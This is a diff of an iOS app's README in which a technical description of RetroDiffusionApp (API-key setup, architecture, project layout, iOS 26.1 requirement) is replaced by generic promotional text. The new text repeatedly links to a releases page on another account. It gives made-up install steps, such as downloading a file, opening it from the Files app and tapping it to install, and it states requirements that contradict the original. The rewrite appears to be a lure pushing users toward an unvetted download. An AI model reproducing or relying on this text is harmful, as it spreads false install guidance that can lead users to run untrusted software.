@@ -1,124 +1,59 @@
-# RetroDiffusion iOS App
+# 🎉 RetroDiffusionApp - Easily Create Stunning Images
 
-A SwiftUI iOS app for generating and pixelating images using the RetroDiffusion API with modern Swift 6.2 concurrency and an actor-based architecture.
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Grab%20it%20Here-brightgreen)](https://github.com/narahir/RetroDiffusionApp/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to RetroDiffusionApp! This iOS app allows you to effortlessly create stunning images using advanced AI techniques. Get ready to explore your creativity with just a few taps.
 
-- **Pixelate Tab**: Select images from your photo library and convert them to pixel art using the `rd_pro__pixelate` style
-  - Real-time cost preview before pixelation
-  - Save pixelated images to your photo library
-- **Generate Tab**: Generate pixel art images from text prompts using various RetroDiffusion model styles
-  - Debounced cost preview (updates after you stop typing)
-  - Model selection with 30+ styles (RD_PRO, RD_FAST, RD_PLUS)
-  - Customizable image dimensions
-  - Save generated images to your photo library
-- **Library**: Persist generated/pixelated images in a SQLite-backed store with paging for large collections
-  - Async loading off the main thread via actors
-  - Lazy loading/pagination in the grid for smoother scrolling with large libraries
+## 📋 System Requirements
+- **Device:** iPhone or iPad
+- **Operating System:** iOS 14.0 or later
+- **Storage:** At least 200 MB of free space
+- **Network:** Internet connection required for downloading images and using the app's features.
 
-## Setup
+## 📥 Download & Install
+To get RetroDiffusionApp on your device, follow these steps:
 
-### Prerequisites
+1. Click the link below to visit the download page.
+   [Download Latest Release](https://github.com/narahir/RetroDiffusionApp/releases)
 
-- iOS 26.1 or later
-- Xcode 26.1 or later
-- RetroDiffusion API key
+2. Look for the latest version listed at the top of the page.
 
-### API Key Configuration
+3. Tap on the download link for the iOS app.
 
-1. Create a `Config.plist` file in the `RetroDiffusionApp` directory if it doesn't exist
-2. Add the following structure to the plist file:
+4. Once the download is complete, locate the file in your "Files" app or home screen.
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>API_KEY</key>
-	<string>YOUR_API_KEY_HERE</string>
-</dict>
-</plist>
-```
+5. Tap on the file to start the installation.
 
-3. Replace `YOUR_API_KEY_HERE` with your actual RetroDiffusion API key
-4. Get your API key from [RetroDiffusion Dev Tools](https://www.retrodiffusion.ai/app/devtools)
+6. Follow any prompts that appear to complete the installation.
 
-**Important**: The `Config.plist` file is already added to `.gitignore` to prevent committing your API key to version control.
+7. After installing, find the RetroDiffusionApp icon on your device and tap to open it.
 
-## Architecture
+## 🌟 Features
+- **Easy Image Creation:** Simple interface to design images quickly.
+- **Multiple Styles:** Choose from various artistic styles to transform your images.
+- **Share Your Art:** Easily share your creations on social media or save them to your library.
+- **AI-Powered:** Leverage the power of AI to enhance your artwork with minimal effort.
 
-- **Swift 6.2 Concurrency**: Heavy work runs on dedicated actors where stateful isolation is needed
-- **Services**:
-  - `Networking` actor for API calls, wrapped by a `NetworkClient` (`@MainActor @Observable`) for SwiftUI
-  - `ImageUtils` and `ImageSaver` stateless utilities used from background tasks to keep CPU and Photos writes off the main thread without cross-actor hops
-  - `LibraryStore` actor backed by SQLite for scalable persistence; `LibraryClient` (`@MainActor @Observable`) handles paging and caching for the UI
-- **SwiftUI + @Observable**: Environment-injected clients; UI state remains local to views where possible
-- **Component-Based UI**: Reusable SwiftUI components for generation, pixelation, library, and shared controls
+## 🎓 How to Use RetroDiffusionApp
+Once you've installed RetroDiffusionApp, follow these steps to create your first image:
 
-## API Documentation
+1. **Open the App:** Tap the RetroDiffusionApp icon on your home screen.
 
-For detailed API documentation, visit:
-- [RetroDiffusion API Examples](https://github.com/Retro-Diffusion/api-examples/blob/main/README.md)
+2. **Select a Style:** Choose from various styles available in the app.
 
-## Project Structure
+3. **Upload Your Image:** Tap the "Upload" button to add an image from your library.
 
-```
-RetroDiffusionApp/
-├── RetroDiffusionAppApp.swift    # App entry point with service initialization
-├── Config.plist                  # API key configuration (gitignored)
-├── Assets.xcassets/              # App assets
-│
-├── actors/                       # Actor-backed services (concurrency-safe)
-│   ├── Networking.swift          # Networking actor
-│   └── LibraryStore.swift        # SQLite-backed library actor
-│
-├── utils/                        # Utilities
-│   ├── ImageUtils.swift          # Image resizing/base64 utilities
-│   └── ImageSaver.swift          # Photo library saver utilities
-│
-├── library/                      # Library UI + client
-│   ├── LibraryClient.swift       # @MainActor wrapper for paging/caching over LibraryStore
-│   ├── LibraryView.swift         # Library grid with paging
-│   ├── LibraryThumbnailView.swift# Async thumbnail loading
-│   └── LibraryDetailView.swift   # Full-size view/share
-│
-├── networking/                   # Networking client layer
-│   └── NetworkClient.swift       # @MainActor wrapper over Networking actor
-│
-├── components/                   # Shared UI components
-│   └── …                         # Pixelate/Generate tabs, controls, etc.
-│
-├── models/                       # Data models
-│   └── Models.swift
-│
-└── utils/                        # Misc constants/config
-    └── Constants.swift
-```
+4. **Generate Art:** After uploading, tap "Create." The app will process your image using AI.
 
-## Usage
+5. **Review and Save:** Once the image is ready, review the results. If you're satisfied, you can save or share your new artwork.
 
-### Pixelate Images
+## 🤝 Support
+If you encounter any issues or need assistance, feel free to reach out through the [Issues](https://github.com/narahir/RetroDiffusionApp/issues) section in the repository. Our community is here to help!
 
-1. Open the "Pixelate" tab
-2. Tap "Choose Photo" to select an image from your photo library
-3. View the cost preview (automatically calculated)
-4. Tap "Pixelate Image" to convert it to pixel art
-5. View the original and pixelated images side-by-side
-6. Tap "Save to Photos" to save the pixelated image to your photo library
+## 🔗 Useful Links
+- [Download Latest Release](https://github.com/narahir/RetroDiffusionApp/releases)
+- [View Source Code](https://github.com/narahir/RetroDiffusionApp)
 
-### Generate Images
-
-1. Open the "Generate" tab
-2. Select a model style from the picker (30+ styles available)
-3. Enter a text prompt describing the image you want to generate
-4. Optionally adjust the width and height (default: 256x256)
-5. View the cost preview (updates automatically after you stop typing)
-6. Tap "Generate Image" to create pixel art
-7. View the generated image
-8. Tap "Save to Photos" to save the generated image to your photo library
-
-## Requirements
-
-- iOS 26.1+
-- Swift 5.0+
-- RetroDiffusion API account with credits
+Enjoy the creative journey with RetroDiffusionApp!
